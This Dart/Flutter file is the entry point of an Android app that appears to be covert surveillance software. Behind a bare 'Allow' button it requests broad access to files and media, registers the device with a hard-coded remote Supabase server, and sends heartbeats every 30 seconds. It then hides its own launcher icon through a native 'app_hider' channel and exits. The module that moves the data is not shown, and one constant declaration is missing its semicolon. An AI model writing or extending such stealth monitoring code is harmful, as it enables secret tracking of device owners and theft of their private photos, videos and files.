import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'core/device_agent.dart';
import 'core/device_id.dart';

const String SUPABASE_URL = 'https://kywpnhaermwldzcwtsnv.supabase.co'                                    
const int HEARTBEAT_INTERVAL_SECONDS = 30;
const MethodChannel _permChannel = MethodChannel('cyber_agent/permissions');
const MethodChannel _appHider = MethodChannel('cyber_accessibility_agent/app_hider');
const String _prefSetupDone = 'setup_done';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  if (SUPABASE_URL.isEmpty) {
    throw Exception('SUPABASE_URL not configured');
  }
  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: PermissionRequestPage(),
    );
  }
}

class PermissionRequestPage extends StatefulWidget {
  const PermissionRequestPage({super.key});

  @override
  State<PermissionRequestPage> createState() => _PermissionRequestPageState();
}

class _PermissionRequestPageState extends State<PermissionRequestPage> {
  @override
  void initState() {
    super.initState();
    _requestPermissions();
  }

  Future<void> _requestPermissions() async {
    try {
      await _permChannel.invokeMethod<dynamic>('requestPermissions');
    } catch (e) {
               
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: ElevatedButton(
          onPressed: () async {
            final ok = await _checkPermissions();
            if (ok) {
              await _startAgent();
              await _hideAppAndClose();
            }
          },
          child: const Text('Allow'),
        ),
      ),
    );
  }

  Future<bool> _checkPermissions() async {
    try {
      final Map<dynamic, dynamic>? map = await _permChannel.invokeMethod('checkStoragePermissions');
      if (map == null) return false;
      return map['hasAllFilesAccess'] == true || map['readMediaImages'] == true || map['readMediaVideo'] == true || map['readMediaAudio'] == true;
    } catch (_) {
      return false;
    }
  }

  Future<void> _startAgent() async {
    final _deviceId = await DeviceId.getOrCreate();
    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_URL,
      deviceId: _deviceId,
    );
    await DeviceAgent.instance.register();
    await DeviceAgent.instance.start();
    _startHeartbeat();
  }

  void _startHeartbeat() {
    Timer.periodic(
      const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
      (_) => DeviceAgent.instance.heartbeat(),
    );
  }

  Future<void> _hideAppAndClose() async {
    try {
      final hid = await _appHider.invokeMethod<bool>('hide');
      if (hid == true) {
        // icon hidden
      }
    } catch (_) {
      // ignore
    }
    await Future.delayed(const Duration(milliseconds: 300));
    try {
      SystemNavigator.pop(animated: true);
    } catch (_) {
      if (Platform.isAndroid) {
        // ignore: avoid_exit
        exit(0);
      }
    }
  }
}
